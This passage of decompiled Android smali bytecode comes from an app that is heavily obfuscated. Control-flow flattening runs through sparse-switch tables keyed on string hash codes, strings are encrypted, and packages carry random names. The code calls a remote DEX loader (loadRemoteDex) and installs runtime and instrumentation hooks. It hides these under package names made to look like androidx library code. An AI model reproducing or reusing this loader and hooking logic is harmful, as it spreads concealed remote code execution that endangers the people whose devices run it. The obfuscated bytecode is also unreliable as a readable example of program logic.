    const-string v0, "\u06ec\u06e0\u06d7\u06e7\u06e4\u06e5\u06e5\u06da\u06db\u06d8\u06e7\u06db\u06eb\u06df\u06dc\u06d8\u06d7\u06d8\u06ec\u06d9\u06e1\u06e7\u06d8\u06d7\u06d6\u06e8\u06d8\u06e4\u06eb\u06e8\u06d9\u06db\u06d9\u06e6\u06da\u06eb\u06d7\u06e6\u06e1\u06d8"

    :goto_2f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_29

    goto :goto_2f

    :sswitch_93
    const-string v0, "\u06df\u06d9\u06e6\u06d8\u06ec\u06eb\u06d7\u06d9\u06d9\u06e2\u06e5\u06d8\u06d8\u06d8\u06eb\u06e5\u06d8\u06e2\u06e7\u06e8\u06d8\u06e5\u06e0\u06d6\u06e5\u06d8\u06e8\u06da\u06e5\u06da\u06d7\u06df\u06e1\u06ec\u06e5\u06d6\u06d8\u06df\u06dc\u06d9\u06e2\u06d9\u06e5\u06eb\u06d8\u06da\u06da\u06d9\u06d9\u06d8\u06e4\u06da"

    goto :goto_2f

    :sswitch_94
    add-int/lit8 v0, v1, 0x1

    move v1, v0

    goto/16 :goto_29

    :sswitch_95
    const-string v0, "\u06e8\u06db\u06e2\u06e2\u06e7\u06d7\u06da\u06e7\u06d6\u06d8\u06e7\u06d6\u06df\u06e1\u06d6\u06d8\u06ec\u06d9\u06df\u06e1\u06e1\u06e5\u06e0\u06ec\u06d8\u06e7\u06e4\u06e8\u06ec\u06dc\u06e1\u06e5\u06da\u06ec\u06d8\u06da\u06dc\u06e5\u06d9\u06e1\u06d6\u06d8"

    goto :goto_2e

    :cond_14
    const-string v0, "\u06e7\u06e1\u06e5\u06d8\u06ec\u06e2\u06da\u06dc\u06dc\u06e8\u06ec\u06e8\u06dc\u06e4\u06e2\u06df\u06e7\u06e7\u06d7\u06d8\u06db\u06e1\u06d8\u06d9\u06e2\u06db\u06d9\u06e1\u06d8\u06d8\u06ec\u06e7\u06e1\u06d8\u06e0\u06e1\u06d6\u06eb\u06da\u06d8\u06d8\u06eb\u06e1\u06e6\u06d8\u06da\u06e8\u06e8"

    goto :goto_2f

    :sswitch_96
    invoke-static {v1}, LKvrUY/RiiGL/Utils;->g(Landroid/app/Activity;)Z

    move-result v0

    if-eqz v0, :cond_14

    const-string v0, "\u06df\u06e8\u06e5\u06d8\u06e1\u06d8\u06e6\u06e0\u06eb\u06df\u06e4\u06d8\u06d8\u06da\u06e7\u06e8\u06e6\u06dc\u06e5\u06e7\u06d9\u06e2\u06eb\u06d6\u06e6\u06e1\u06da\u06e2\u06e4\u06da\u06d8\u06e2\u06ec\u06d6\u06d8\u06e0\u06e7\u06e6\u06e4\u06e6\u06e6\u06d8\u06d6\u06d7\u06d7\u06ec\u06d7\u06df\u06e2\u06e5\u06df"

    goto :goto_2f

    :sswitch_97
    const-string v0, "\u06df\u06dc\u06e8\u06d8\u06e8\u06ec\u06ec\u06e7\u06e0\u06e7\u06e8\u06eb\u06e7\u06d9\u06da\u06d6\u06e4\u06eb\u06d8\u06e6\u06d8\u06e5\u06d8\u06e8\u06d8\u06dc\u06e6\u06d9\u06dc\u06d8\u06df\u06d6\u06d8\u06e6\u06e0\u06d6\u06d9\u06e4\u06dc\u06d7\u06d9\u06da\u06e2\u06e8\u06e8\u06e1\u06e7\u06db\u06d6\u06d8\u06d7\u06d9\u06e1\u06eb\u06d8\u06ec\u06da"

    goto :goto_2e

    :sswitch_98
    const-string v0, "\u06d9\u06d8\u06e1\u06d9\u06e0\u06e7\u06e1\u06e5\u06e8\u06d8\u06eb\u06eb\u06e0\u06d7\u06d6\u06e5\u06d8\u06d9\u06e8\u06db\u06df\u06e7\u06e5\u06dc\u06d6\u06d9\u06d6\u06e7\u06e1\u06d8\u06dc\u06e5\u06d9\u06dc\u06e5\u06e6\u06e5\u06d7\u06df\u06e1\u06e0\u06e7\u06d9\u06d9\u06e1\u06d8\u06d8\u06d7\u06e6\u06d8\u06e0\u06e0\u06e5\u06d8\u06e5\u06e7\u06dc\u06e5\u06db\u06e6\u06d8"

    goto :goto_2e

    :sswitch_99
    new-instance v0, Landroidx/base/연결;

    const/4 v2, 0x3

    invoke-direct {v0, v1, p0, v2}, Landroidx/base/연결;-><init>(Landroid/app/Activity;Landroid/content/Context;I)V

    invoke-virtual {v1, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :goto_30
    invoke-static {p0}, LKvrUY/RiiGL/Utils;->loadRemoteDex(Landroid/content/Context;)V

    const v1, -0x7b7493f2

    const-string v0, "\u06d8\u06d6\u06e6\u06e5\u06d7\u06eb\u06e0\u06eb\u06df\u06d9\u06eb\u06e5\u06d7\u06e0\u06e2\u06d8\u06d6\u06db\u06eb\u06dc\u06d8\u06db\u06e6\u06e7\u06d6\u06e7\u06d8\u06e4\u06e0\u06d6\u06dc\u06e6\u06db\u06d9\u06e2\u06da\u06e2\u06e4\u06e0\u06e0\u06dc\u06dc\u06d8"

    :goto_31
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_2a

    goto :goto_31

    :goto_32
    :sswitch_9a
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Landroidx/base/처리;

    const/4 v2, 0x3

    invoke-direct {v1, v2}, Landroidx/base/처리;-><init>(I)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto/16 :goto_22

    :sswitch_9b
    const-string v0, "p+FLrhs3KbEapn/UXyxWRmvjeJ4WJSkKYKwSunh/FWsZo0o=\n"

    const-string v1, "/Ab3Pf6asew=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_30

    :sswitch_9c
    const-string v0, "\u06e6\u06da\u06df\u06da\u06d6\u06dc\u06e8\u06e4\u06ec\u06d6\u06e7\u06d8\u06df\u06e6\u06ec\u06db\u06e4\u06e7\u06e0\u06e5\u06dc\u06eb\u06d7\u06e6\u06d6\u06e6\u06d6\u06d8\u06e4\u06e5\u06ec\u06db\u06e6\u06d8\u06e6\u06e1\u06dc\u06d8\u06dc\u06da\u06eb\u06e2\u06dc\u06d8\u06d8\u06e0\u06d6\u06d8\u06e6\u06e1\u06e2\u06e8\u06d9\u06eb\u06e0\u06d8\u06e6"

    goto :goto_31

    :sswitch_9d
    const v2, 0x45c28edb

    const-string v0, "\u06e7\u06eb\u06d7\u06d8\u06d6\u06ec\u06e1\u06d7\u06e7\u06e1\u06e0\u06e0\u06e2\u06df\u06e8\u06db\u06eb\u06e5\u06d8\u06ec\u06e2\u06e4\u06d7\u06e7\u06df\u06e4\u06e5\u06e2\u06d8\u06eb\u06db\u06e8\u06e7\u06db\u06e1\u06e7\u06d8\u06e1\u06df\u06d9\u06df\u06eb\u06e8"

    :goto_33
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2b

    goto :goto_33

    :sswitch_9e
    const-string v0, "\u06eb\u06d6\u06e0\u06e4\u06ec\u06dc\u06d8\u06dc\u06d8\u06e5\u06d8\u06da\u06da\u06e4\u06e7\u06ec\u06d6\u06d8\u06df\u06dc\u06e4\u06db\u06ec\u06e5\u06db\u06d9\u06db\u06ec\u06ec\u06e8\u06df\u06e1\u06e7\u06d8\u06d7\u06e8\u06dc\u06d7\u06d7\u06e8\u06d8\u06e6\u06e7\u06e4\u06db\u06eb\u06d6\u06d8"

    goto :goto_31

    :cond_15
    const-string v0, "\u06d8\u06e5\u06e1\u06d8\u06e4\u06d9\u06e5\u06d8\u06e7\u06eb\u06d8\u06d8\u06db\u06e4\u06e1\u06d8\u06e6\u06d6\u06d8\u06d8\u06e4\u06e1\u06e8\u06e0\u06d8\u06e4\u06df\u06e0\u06dc\u06d8\u06e7\u06d7\u06e6\u06d8\u06da\u06db\u06d9\u06d7\u06df\u06d7\u06ec\u06d6\u06dc\u06df\u06e8\u06da\u06db\u06d7\u06dc\u06d8\u06e4\u06e0\u06d9\u06e0\u06e1\u06da\u06df\u06db\u06d8\u06df\u06e6\u06e5\u06d8"

    goto :goto_33

    :sswitch_9f
    const-string v0, "54ZQDlZ+24Ttgw==\n"

    const-string v3, "gugxbDobk+s=\n"

    invoke-static {v0, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x1

    invoke-virtual {v5, v0, v3}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_15

    const-string v0, "\u06e5\u06d8\u06d9\u06d6\u06e4\u06db\u06da\u06d8\u06d6\u06d8\u06e6\u06e1\u06dc\u06e6\u06dc\u06d6\u06d8\u06e1\u06e7\u06d7\u06da\u06d8\u06db\u06e0\u06e7\u06d7\u06e6\u06d6\u06d9\u06df\u06df\u06e5"

    goto :goto_33

    :sswitch_a0
    const-string v0, "\u06da\u06e7\u06da\u06e4\u06e6\u06e8\u06d8\u06e5\u06d8\u06e4\u06ec\u06d8\u06db\u06e6\u06ec\u06eb\u06dc\u06dc\u06dc\u06e5\u06d6\u06d8\u06db\u06dc\u06db\u06da\u06eb\u06d6\u06ec\u06da\u06d8\u06d8\u06eb\u06d8\u06db\u06df\u06e2\u06db"

    goto :goto_33

    :sswitch_a1
    const-string v0, "\u06e4\u06d9\u06d9\u06dc\u06df\u06d6\u06d8\u06e4\u06eb\u06e4\u06e1\u06d7\u06eb\u06e8\u06d9\u06db\u06ec\u06d8\u06e2\u06da\u06e2\u06d7\u06e5\u06e7\u06e6\u06d8\u06d9\u06e4\u06e6\u06df\u06e4\u06da\u06e5\u06d8\u06df\u06e5\u06e8\u06e1\u06e1\u06e0\u06d6\u06da\u06e7\u06d8\u06d8\u06e1\u06e1\u06eb\u06d9\u06e7\u06ec"

    goto :goto_31

    :sswitch_a2
    const-string v0, "/I5FwXwFJsf7n0s=\n"

    const-string v1, "kusyoB9xT7E=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    const v2, 0x7d95b885

    const-string v0, "\u06df\u06e2\u06e4\u06e7\u06eb\u06e8\u06d8\u06df\u06e4\u06e1\u06d8\u06d7\u06e8\u06dc\u06d8\u06d9\u06e7\u06e2\u06e4\u06df\u06d7\u06e1\u06eb\u06e4\u06eb\u06d7\u06e5\u06d8\u06e4\u06d6\u06d6\u06d7\u06eb\u06e6\u06d6\u06d9\u06dc\u06e5\u06d7\u06df\u06ec\u06df\u06dc\u06d8\u06e1\u06e4\u06e8\u06d6\u06eb\u06dc\u06d8\u06e8\u06e7\u06d8\u06d8"

    :goto_34
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2c

    goto :goto_34

    :sswitch_a3
    invoke-static {p0}, LKvrUY/RiiGL/HookManager;->initHooks(Landroid/content/Context;)V

    goto :goto_32

    :sswitch_a4
    const-string v0, "\u06e5\u06e5\u06da\u06e0\u06ec\u06d6\u06d8\u06da\u06e8\u06d6\u06d7\u06db\u06e6\u06e2\u06df\u06e0\u06e0\u06e5\u06d9\u06e2\u06e5\u06dc\u06d8\u06da\u06e6\u06d9\u06e7\u06e5\u06e7\u06d8\u06ec\u06d9\u06db\u06d9\u06da\u06e4\u06da\u06e5\u06db"

    goto :goto_34

    :sswitch_a5
    const v3, -0x75d45dca

    const-string v0, "\u06ec\u06e5\u06e5\u06db\u06d6\u06d6\u06ec\u06e2\u06e5\u06d8\u06d6\u06ec\u06dc\u06d8\u06e6\u06e8\u06df\u06d9\u06d7\u06da\u06e0\u06d7\u06d6\u06d8\u06d9\u06dc\u06e8\u06d8\u06eb\u06df\u06e4\u06e8\u06da\u06e7\u06dc\u06e5\u06d6\u06d6\u06e0"

    :goto_35
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_2d

    goto :goto_35

    :sswitch_a6
    const-string v0, "\u06e8\u06e1\u06d8\u06db\u06e4\u06d8\u06da\u06e5\u06dc\u06e4\u06ec\u06d9\u06e7\u06e2\u06e8\u06e1\u06d7\u06d6\u06e0\u06db\u06d8\u06d8\u06e8\u06e6\u06d8\u06d7\u06d7\u06e5\u06d7"

    goto :goto_35

    :cond_16
    const-string v0, "\u06df\u06e2\u06d7\u06e8\u06eb\u06d8\u06d8\u06d7\u06da\u06df\u06e1\u06da\u06d9\u06e5\u06e7\u06e8\u06e1\u06ec\u06da\u06ec\u06eb\u06e1\u06d8\u06e6\u06df\u06ec\u06dc\u06e8\u06e5\u06d8\u06da\u06e1\u06e6\u06d8\u06e6\u06e6\u06e1\u06e4\u06d6\u06e8\u06e7\u06e4\u06e1\u06d9\u06df\u06e2\u06dc\u06ec\u06e0\u06d9\u06d6\u06db\u06e5\u06dc\u06e6\u06d8\u06e1\u06e5\u06dc"

    goto :goto_35

    :sswitch_a7
    if-eqz v1, :cond_16

    const-string v0, "\u06e6\u06d8\u06e5\u06d8\u06ec\u06ec\u06dc\u06d8\u06e0\u06d9\u06ec\u06e2\u06e0\u06e6\u06d8\u06d9\u06dc\u06e4\u06df\u06eb\u06e5\u06d6\u06da\u06e7\u06eb\u06e7\u06df\u06d7\u06e5\u06e8\u06d8\u06db\u06d9\u06db\u06eb\u06e8\u06e7\u06eb\u06dc\u06e5\u06d8\u06e5\u06e4\u06d7\u06e1\u06da\u06d9\u06d7\u06e0\u06e1\u06e0\u06e2\u06d9\u06e1\u06df\u06e1\u06e5\u06d7\u06eb"

    goto :goto_35

    :sswitch_a8
    const-string v0, "\u06e7\u06d6\u06db\u06db\u06e7\u06d9\u06db\u06df\u06e1\u06d8\u06db\u06e8\u06ec\u06d7\u06e2\u06e8\u06d9\u06df\u06e7\u06da\u06d8\u06d8\u06d8\u06e6\u06e6\u06e4\u06e5\u06dc\u06e8\u06da\u06eb\u06e1\u06db\u06d9\u06dc\u06d8\u06eb\u06e7\u06e0\u06d9\u06dc\u06db\u06d7\u06da\u06dc\u06d8\u06db\u06eb\u06ec\u06e7\u06df\u06dc\u06d8"
    :try_end_13
    .catch Ljava/lang/Exception; {:try_start_13 .. :try_end_13} :catch_1

    goto :goto_34

    :sswitch_a9
    const-string v0, "\u06dc\u06e4\u06e1\u06e0\u06e1\u06dc\u06d8\u06d6\u06d6\u06ec\u06e1\u06e4\u06dc\u06d7\u06e8\u06e2\u06e6\u06d9\u06d6\u06d8\u06e6\u06d8\u06d6\u06d8\u06e7\u06e6\u06e1\u06d8\u06e4\u06db\u06e5\u06e2\u06dc\u06da\u06e0\u06e7\u06e6\u06e2\u06d6\u06d8\u06e0\u06e7\u06dc\u06d8\u06d6\u06e5\u06e5\u06eb\u06d6\u06e1\u06d8\u06d9\u06d9\u06d7\u06da\u06da\u06e6\u06d8\u06d7\u06e5\u06dc"

    goto :goto_34

    :sswitch_aa
    const v2, 0x7d079093

    :try_start_14
    const-string v0, "\u06e7\u06d7\u06e5\u06d8\u06e2\u06d7\u06e0\u06d8\u06e8\u06d8\u06e5\u06d8\u06df\u06e0\u06e1\u06d8\u06e7\u06dc\u06db\u06d7\u06e5\u06ec\u06e5\u06e8\u06d8\u06db\u06e8\u06d6\u06d9\u06dc\u06e0\u06e1\u06dc\u06e1\u06d8\u06e7\u06e2\u06eb"

    :goto_36
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_2e

    goto :goto_36

    :sswitch_ab
    const v3, 0x1be67d37

    const-string v0, "\u06e6\u06db\u06e7\u06e7\u06e1\u06d7\u06e6\u06eb\u06e2\u06eb\u06e8\u06e2\u06db\u06e4\u06dc\u06d8\u06e7\u06e6\u06e6\u06d8\u06d8\u06e7\u06e0\u06e0\u06d8\u06e8\u06d8\u06d9\u06e8\u06e7\u06ec\u06df\u06e8\u06e8\u06d7\u06e5\u06ec\u06d7\u06d7\u06e5\u06e0\u06d8\u06e0\u06e6\u06d8\u06d8\u06dc\u06da\u06e4\u06e8\u06eb\u06eb\u06d8\u06e0\u06e8\u06e7\u06d8\u06d7"

    :goto_37
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v3

    sparse-switch v4, :sswitch_data_2f

    goto :goto_37

    :sswitch_ac
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_17

    const-string v0, "\u06da\u06e8\u06e6\u06e8\u06e2\u06df\u06db\u06e7\u06d8\u06d8\u06da\u06da\u06df\u06d7\u06df\u06d7\u06da\u06e6\u06dc\u06d7\u06d7\u06e8\u06d8\u06e4\u06e7\u06e7\u06da\u06e1\u06e6\u06d8\u06e2\u06d8\u06e4\u06e1\u06e5\u06da\u06d7\u06d9\u06e1\u06eb\u06da\u06d7\u06db\u06e0\u06e8\u06df\u06d9\u06e5\u06dc\u06e5\u06e8\u06d6\u06d8\u06e2\u06e2\u06e2"

    goto :goto_37

    :sswitch_ad
    const-string v0, "\u06da\u06e5\u06e2\u06e2\u06e5\u06eb\u06db\u06d8\u06ec\u06d8\u06d8\u06d7\u06e5\u06d7\u06d9\u06db\u06e1\u06eb\u06df\u06e5\u06dc\u06d6\u06e8\u06d9\u06eb\u06e2\u06eb\u06e2\u06d6\u06dc\u06df\u06e1\u06e7\u06e6\u06e5\u06d8\u06e8\u06dc\u06e7\u06eb\u06ec\u06e8\u06d8\u06e4\u06db\u06e6\u06d6\u06d7\u06df"

    goto :goto_36

    :cond_17
    const-string v0, "\u06e0\u06e8\u06e1\u06da\u06e7\u06e5\u06e8\u06d6\u06e8\u06d8\u06d6\u06e2\u06d8\u06ec\u06e4\u06e5\u06d8\u06d9\u06db\u06da\u06e1\u06d6\u06d8\u06d8\u06e2\u06e4\u06e1\u06d8\u06d9\u06d6\u06e6\u06e6\u06d7\u06e0\u06d8\u06df\u06e7\u06e4\u06e4\u06e7\u06e5\u06db\u06da\u06d8\u06db\u06ec\u06df\u06e5\u06d8\u06eb\u06da\u06d8"

    goto :goto_37

    :sswitch_ae
    const-string v0, "\u06d6\u06d6\u06e0\u06e2\u06db\u06e1\u06d8\u06e2\u06eb\u06db\u06e1\u06d9\u06e8\u06d9\u06e1\u06e6\u06d6\u06e0\u06eb\u06e5\u06d8\u06db\u06d9\u06dc\u06d8\u06df\u06e1\u06e0\u06eb\u06eb\u06e6"

    goto :goto_37

    :sswitch_af
    const-string v0, "\u06e2\u06e6\u06e1\u06d8\u06e6\u06ec\u06e0\u06eb\u06e2\u06dc\u06d8\u06eb\u06e2\u06e4\u06dc\u06e7\u06da\u06d7\u06e6\u06d6\u06d8\u06e5\u06e7\u06d8\u06d8\u06e4\u06d8\u06dc\u06d8\u06e7\u06da\u06e1\u06e0\u06e0\u06d6\u06d8\u06e7\u06e6\u06e6\u06d8\u06e0\u06e5\u06ec"

    goto :goto_36

    :sswitch_b0
    const-string v0, "\u06e0\u06da\u06e8\u06d6\u06e8\u06e2\u06e0\u06dc\u06e7\u06e4\u06d9\u06e0\u06d7\u06e5\u06d6\u06ec\u06e8\u06da\u06e4\u06d6\u06e6\u06df\u06ec\u06e2\u06d9\u06e4\u06db\u06da\u06e6\u06e7\u06e5\u06d8\u06d7\u06e0\u06db\u06da\u06e8\u06df\u06dc\u06d8\u06d7\u06e8\u06e8\u06e4\u06df\u06db\u06df\u06e0\u06e0\u06e4\u06e1\u06db\u06d6\u06d8"

    goto :goto_36

    :sswitch_b1
    invoke-static {p0}, LKvrUY/RiiGL/HookManager;->hookInstrumentation(Landroid/content/Context;)V

    goto/16 :goto_32

    :sswitch_b2
    const-string v0, "N4U0R34D/rCK9SgzJz2DQPRObkg3SMpMiNoFPCstgXnEhTRHfgP+CObCYGkm\n"

    const-string v1, "bGKI1JuuZu0=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "lMs=\n"

    const-string v2, "+6ACiNCrAcM=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_14 .. :try_end_14} :catch_1

    goto/16 :goto_22

    :sswitch_data_0
    .sparse-switch
        -0x741a482d -> :sswitch_6
        -0x23f76a70 -> :sswitch_2
        0x3db90528 -> :sswitch_0
        0x74dc4dbe -> :sswitch_b2
    .end sparse-switch

    :sswitch_data_1
    .sparse-switch
        -0x757f7625 -> :sswitch_3
        -0x19f646d1 -> :sswitch_5
        0x10997629 -> :sswitch_4
        0x15104420 -> :sswitch_1
    .end sparse-switch

    :sswitch_data_2
    .sparse-switch
        -0x74404830 -> :sswitch_c
        -0x5466a72c -> :sswitch_7
        -0x5122ee28 -> :sswitch_b2
        0x447f2da -> :sswitch_d
    .end sparse-switch

    :sswitch_data_3
    .sparse-switch
        0x4adc2e -> :sswitch_b
        0x9d6200f -> :sswitch_8
        0x45b7cf44 -> :sswitch_a
        0x68aeb967 -> :sswitch_9
    .end sparse-switch

    :sswitch_data_4
    .sparse-switch
        -0x67b5fe66 -> :sswitch_e
        0xd657997 -> :sswitch_11
        0x1c336458 -> :sswitch_b2
        0x4ad4e74b -> :sswitch_15
    .end sparse-switch

    :sswitch_data_5
    .sparse-switch
        -0x7001b32e -> :sswitch_1b
        -0x4667d721 -> :sswitch_f
        -0x1dbd73dc -> :sswitch_74
        0x6484b752 -> :sswitch_17
    .end sparse-switch

    :sswitch_data_6
    .sparse-switch
        0xb2d2769 -> :sswitch_14
        0x1afde022 -> :sswitch_12
        0x44ebf1a3 -> :sswitch_13
        0x6794dafa -> :sswitch_10
    .end sparse-switch

    :sswitch_data_7
    .sparse-switch
        -0x7d9f2017 -> :sswitch_19
        -0x777308d1 -> :sswitch_16
        0x74d12435 -> :sswitch_1a
        0x755d99d2 -> :sswitch_18
    .end sparse-switch

    :sswitch_data_8
    .sparse-switch
        -0x58f9d15b -> :sswitch_74
        -0x3543f3b9 -> :sswitch_24
        0x2869a57f -> :sswitch_1c
        0x428665c5 -> :sswitch_20
    .end sparse-switch

    :sswitch_data_9
    .sparse-switch
        -0x7a336e0c -> :sswitch_74
        -0x6dc27f0a -> :sswitch_1d
        0x1d9050a6 -> :sswitch_29
        0x6cd336fc -> :sswitch_28
    .end sparse-switch

    :sswitch_data_a
    .sparse-switch
        -0xb1bd3e6 -> :sswitch_26
        0x15e66c7 -> :sswitch_25
        0x37c112b7 -> :sswitch_1e
        0x70a4e145 -> :sswitch_27
    .end sparse-switch

    :sswitch_data_b
    .sparse-switch
        0x24d3fcb8 -> :sswitch_22
        0x4115d26e -> :sswitch_1f
        0x4b8c1faf -> :sswitch_23
        0x5d44f868 -> :sswitch_21
    .end sparse-switch

    :sswitch_data_c
    .sparse-switch
        -0x5c3c5841 -> :sswitch_30
        -0x411c43e4 -> :sswitch_2a
        -0x2eaad8 -> :sswitch_74
        0x3eb36784 -> :sswitch_2c
    .end sparse-switch

    :sswitch_data_d
    .sparse-switch
        0x2f2c841c -> :sswitch_2e
        0x48a19360 -> :sswitch_2f
        0x6e8c6913 -> :sswitch_2d
        0x7e60d759 -> :sswitch_2b
    .end sparse-switch

    :sswitch_data_e
    .sparse-switch
        -0x6ed77806 -> :sswitch_71
        0x628a1fe -> :sswitch_36
        0x1a746bd5 -> :sswitch_37
        0x6866e2a7 -> :sswitch_31
    .end sparse-switch

    :sswitch_data_f
    .sparse-switch
        -0x7dac6a19 -> :sswitch_34
        -0x416ab425 -> :sswitch_35
        -0x316d1bd1 -> :sswitch_33
        0x2b3c9dd2 -> :sswitch_32
    .end sparse-switch

    :sswitch_data_10
    .sparse-switch
        -0x6b12f8b6 -> :sswitch_3a
        -0x69e5a7c0 -> :sswitch_38
        -0x2a5ec95f -> :sswitch_3f
        0x164e6b80 -> :sswitch_3e
    .end sparse-switch

    :sswitch_data_11
    .sparse-switch
        -0x72101afa -> :sswitch_3c
        -0x69befb0d -> :sswitch_39
        -0x6508e6bc -> :sswitch_3d
        0x71394a15 -> :sswitch_3b
    .end sparse-switch

    :sswitch_data_12
    .sparse-switch
        -0x6fefe2ac -> :sswitch_43
        -0x66f6a2c8 -> :sswitch_47
        -0x66388f99 -> :sswitch_3f
        -0x4d920b19 -> :sswitch_53
    .end sparse-switch

    :sswitch_data_13
    .sparse-switch
        -0x7584fbc9 -> :sswitch_71
        0x67acaa45 -> :sswitch_4c
        0x7c3b10c2 -> :sswitch_40
        0x7fd9fa75 -> :sswitch_4b
    .end sparse-switch

    :sswitch_data_14
    .sparse-switch
        -0x5e3c6298 -> :sswitch_4a
        -0x519b1c8f -> :sswitch_41
        0x2735fe9d -> :sswitch_49
        0x5e566f26 -> :sswitch_48
    .end sparse-switch

    :sswitch_data_15
    .sparse-switch
        -0x643df5f5 -> :sswitch_46
        -0x39a40e67 -> :sswitch_45
        0x19990646 -> :sswitch_44
        0x3c469489 -> :sswitch_42
    .end sparse-switch

    :sswitch_data_16
    .sparse-switch
        -0x6d7b3431 -> :sswitch_4f
        -0x1bd87bdb -> :sswitch_4d
        0x52e47485 -> :sswitch_53
        0x7c2356cf -> :sswitch_71
    .end sparse-switch

    :sswitch_data_17
    .sparse-switch
        0xc3a5a24 -> :sswitch_4e
        0x39232a5c -> :sswitch_50
        0x7d4cb2cc -> :sswitch_52
        0x7e25b4d1 -> :sswitch_51
    .end sparse-switch

    :sswitch_data_18
    .sparse-switch
        0x9f7d1f2 -> :sswitch_56
        0x3a7fda9d -> :sswitch_5a
        0x4284ed4d -> :sswitch_54
        0x5fbb4775 -> :sswitch_73
    .end sparse-switch

    :sswitch_data_19
    .sparse-switch
        -0x6933a6e8 -> :sswitch_55
        0xbbb44b6 -> :sswitch_58
        0x29d2c6e4 -> :sswitch_59
        0x57226296 -> :sswitch_57
    .end sparse-switch

    :sswitch_data_1a
    .sparse-switch
        -0x437b7d79 -> :sswitch_5b
        0x1f7d9176 -> :sswitch_5d
        0x234460ad -> :sswitch_61
        0x779b8ac1 -> :sswitch_72
    .end sparse-switch

    :sswitch_data_1b
    .sparse-switch
        -0x4f8a0408 -> :sswitch_60
        -0x2f6d8cc3 -> :sswitch_5f
        -0x1c0af99d -> :sswitch_5e
        -0x1338a190 -> :sswitch_5c
    .end sparse-switch

    :sswitch_data_1c
    .sparse-switch
        -0x7ee7ac34 -> :sswitch_70
        -0x56b64612 -> :sswitch_62
        0x78c7520 -> :sswitch_6a
        0x5e5dc153 -> :sswitch_66
    .end sparse-switch

    :sswitch_data_1d
    .sparse-switch
        -0x747a51fd -> :sswitch_71
        -0x1e9c3ec2 -> :sswitch_6e
        -0xf33703c -> :sswitch_6f
        0x67f372d6 -> :sswitch_63
    .end sparse-switch

    :sswitch_data_1e
    .sparse-switch
        -0x2a766f55 -> :sswitch_64
        0x3666d983 -> :sswitch_6d
        0x37bda4af -> :sswitch_6c
        0x405779b4 -> :sswitch_6b
    .end sparse-switch

    :sswitch_data_1f
    .sparse-switch
        -0x3c26d122 -> :sswitch_65
        0x1560dbc6 -> :sswitch_67
        0x37ce734c -> :sswitch_68
        0x6ade6e84 -> :sswitch_69
    .end sparse-switch

    :sswitch_data_20
    .sparse-switch
        -0x5e9996c3 -> :sswitch_91
        -0x2eb51398 -> :sswitch_77
        -0x1fae161d -> :sswitch_75
        -0x114bfd0b -> :sswitch_7b
    .end sparse-switch

    :sswitch_data_21
    .sparse-switch
        -0xb1d8915 -> :sswitch_7a
        0x1578a71 -> :sswitch_76
        0x4c950465 -> :sswitch_78
        0x5efb1ac7 -> :sswitch_79
    .end sparse-switch

    :sswitch_data_22
    .sparse-switch
        -0x32364671 -> :sswitch_7c
        -0x306764d7 -> :sswitch_91
        -0xf90d3c -> :sswitch_81
        0x4efe3ff1 -> :sswitch_82
    .end sparse-switch

    :sswitch_data_23
    .sparse-switch
        -0x66f26ee0 -> :sswitch_7f
        0x3eb0a57b -> :sswitch_80
        0x4c603ada -> :sswitch_7d
        0x5dc6017b -> :sswitch_7e
    .end sparse-switch

    :sswitch_data_24
    .sparse-switch
        -0x3115dea7 -> :sswitch_89
        0x2a9f4686 -> :sswitch_83
        0x3c98e64c -> :sswitch_85
        0x465814ee -> :sswitch_91
    .end sparse-switch

    :sswitch_data_25
    .sparse-switch
        -0x68a508f0 -> :sswitch_88
        0x3ce81924 -> :sswitch_86
        0x59e27ec1 -> :sswitch_84
        0x6b581041 -> :sswitch_87
    .end sparse-switch

    :sswitch_data_26
    .sparse-switch
        -0x66e8bf01 -> :sswitch_90
        -0x61f47fa6 -> :sswitch_8a
        0x3cd97e7 -> :sswitch_8f
        0x79189efe -> :sswitch_94
    .end sparse-switch

